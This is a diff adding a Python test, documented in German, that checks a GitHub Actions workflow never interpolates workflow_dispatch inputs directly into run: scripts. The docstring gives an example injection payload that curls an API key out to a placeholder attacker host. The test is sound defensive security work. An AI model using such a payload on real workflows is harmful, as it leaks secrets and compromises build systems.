@@ -98,6 +98,31 @@ def test_workflow_aborts_hard_when_secret_missing():
     assert "exit 1" in text
 
 
+def test_workflow_dispatch_input_not_interpolated_directly_into_run_script():
+    """Der workflow_dispatch-Input ``component`` ist untrusted (jeder mit Trigger-
+    Recht kann ihn frei setzen). Direkte ``${{ inputs.* }}``-Interpolation in
+    einem ``run:``-Skript ist Shell-/Template-Injection: GitHub Actions ersetzt
+    den Ausdruck VOR der Shell-Auswertung textuell, ein Payload wie
+    ``$(curl attacker/-d $ANTHROPIC_API_KEY)`` wuerde als Shell-Code laufen und
+    koennte ``ANTHROPIC_API_KEY`` aus dem Step-Environment exfiltrieren. Muss
+    stattdessen ueber ``env:`` gebunden und als Shell-Variable (``"$VAR"``)
+    referenziert werden (Fix-Runde PR #504 / Issue #470)."""
+    job = _job(_load_workflow())
+    steps = job.get("steps", [])
+    for step in steps:
+        run_text = str(step.get("run", ""))
+        assert "${{ inputs." not in run_text, (
+            f"Step {step.get('name')!r} interpoliert einen workflow_dispatch-Input "
+            "direkt in run: -- Shell-Injection-Risiko. Ueber env: binden statt "
+            "in run: zu templaten."
+        )
+        assert "${{ github.event.inputs." not in run_text, (
+            f"Step {step.get('name')!r} interpoliert github.event.inputs direkt "
+            "in run: -- Shell-Injection-Risiko. Ueber env: binden statt in run: "
+            "zu templaten."
+        )
+
+
 def test_workflow_uploads_result_artifact_and_writes_summary():
     """Erfolg/Fehlschlag muss sichtbar gemacht werden: Step-Summary + Artefakt."""
     job = _job(_load_workflow())
